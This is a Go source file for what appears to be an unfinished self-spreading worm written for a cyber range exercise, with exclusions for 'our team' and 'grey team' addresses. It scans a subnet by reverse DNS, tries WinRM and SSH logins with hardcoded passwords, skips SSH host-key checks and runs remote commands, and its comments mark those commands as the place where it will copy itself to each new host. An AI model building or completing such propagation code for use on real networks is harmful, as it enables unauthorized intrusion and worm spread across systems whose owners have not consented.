package main

import (
	"fmt"
	"io"
	"net"
	"runtime"
	"sync"
	"unicode"

	"github.com/masterzen/winrm"
	"golang.org/x/crypto/ssh"
)

type Platform struct {
	OS string
	Arch string
}

func is_only_letters(s string) bool {
	for _, character := range s{
		if !unicode.IsLetter(character){
			return false
		}
	}
	return true
}

func reverse_lookup_hosts(subnet string) []string {
    var (
        found []string
        mu    sync.Mutex
        wg    sync.WaitGroup
    )
 
    sem := make(chan struct{}, 20) // 20 concurrent lookups

    for i := 1; i < 255; i++ {
        wg.Add(1)
        go func(i int) {
            defer wg.Done()
            sem <- struct{}{}
            defer func() { <-sem }()

            ip := fmt.Sprintf("%s.%d", subnet, i)
            _, err := net.LookupAddr(ip)

            if err != nil { 
				return 
			}

			mu.Lock()
			found = append(found, ip)
			mu.Unlock()
        }(i)
    }

    wg.Wait()
    return found
}


func establish_winRM(host_ip, username, pswd string) (*winrm.Client, error){
	endpoint := winrm.NewEndpoint(
        host_ip,      // host
        5985,   	 // port (5985 http, 5986 https)
        false,  	 // https
        false,  	 // insecure
        nil,    	 // tlsCert
        nil,    	 // tlsKey
        nil,    	 // caCert
        0,      	 // timeout
    )

	client, err := winrm.NewClient(endpoint, username, pswd)
	if err != nil {
		return nil, err
	}

	return client, nil
}

func run_WinRM_cmds(winrm_client *winrm.Client, cmd string) error {
	_, err := winrm_client.Run(cmd, io.Discard, io.Discard)
	return err
}

func establish_SSH(host_ip, username, pswd string) (*ssh.Client, error){
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(pswd),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client, err := ssh.Dial("tcp", host_ip + ":22", config)
	if err != nil {
		return nil, err
	}

	return client, nil
}

func run_SSH_cmds(ssh_client *ssh.Client, cmd string) error {
	session, err := ssh_client.NewSession()
	if err != nil {
		return err
	}
	defer session.Close()

	return session.Run(cmd)

}

/*
Look for next host to move to

1. Look at DNS records

2. Brute force connection by trying WinRM or SSH
*/
func spread() {
	exclusion_list := []string{
		// Our team systems
		"10.10.100.101",
		"10.10.100.102",
		"10.10.100.103",
		"10.10.100.104",
		"10.10.100.105",
		"10.10.100.106",
		"10.10.100.107",
		"10.10.100.108",
	}

	// Grey team systems that have to be excluded
	for i := 200; i < 255; i++ {
		exclusion_list = append(exclusion_list, fmt.Sprintf("%s.%d", "10.10.10", i))
	} 

	exclusion_map := make(map[string]bool)
	for _, ip := range exclusion_list {
		exclusion_map[ip] = true
	}

	target_hosts := reverse_lookup_hosts("10.10.10")

	for _, host_ip := range target_hosts {

		// Skip IPs that are not in target scope
		if exclusion_map[host_ip] {
			continue
		}

		// ********************************************
		// Brute force connect to IPs via SSH or WinRM
		// ********************************************

		// WinRM
		winrm_client, err := establish_winRM(host_ip, "sjohnson", "UwU?OwO!67")
		if err != nil {
			fmt.Println("Failed to WinRM to: " + host_ip)
		}

		// Command to copy itself to new host
		run_WinRM_cmds(winrm_client, "ipconfig")

		// SSH
		ssh_client, err := establish_SSH(host_ip, "cyberrange", "Cyberrange123!")
		if err != nil {
			fmt.Println("Failed to SSH to: " + host_ip) // debugging
		}
		defer ssh_client.Close()

		// Command to copy itself to new host
		run_SSH_cmds(ssh_client, "echo hi")

	} 

}


func main(){
	
	host_os := runtime.GOOS
	arch := runtime.GOARCH
	
	// used to format to get only the number in 'intelXX' or 'amdXX'
	if !is_only_letters(arch){
		arch = arch[len(arch)-2:]
	} 

	/*
	!!! COME BACK HERE WHEN WAGON IS DONE TO EMBED EXEs INTO DICT !!! 
	*/
	binaries := map[Platform]string {
		{OS: "windows", Arch:"64"} : "WINDOWS - x64",
		{OS: "windows", Arch:"86"} : "WINDOWS - x86",
		{OS: "windows", Arch:"arm"} : "WINDOWS - ARM",
		{OS: "linux", Arch:"64"} : "LINUX - x64",
		{OS: "linux", Arch:"86"} : "LINUX - x86",
		{OS: "linux", Arch:"arm"} : "LINUX - ARM",
	}

	fmt.Println(binaries[Platform{OS: host_os, Arch: arch}])
	
	spread()

}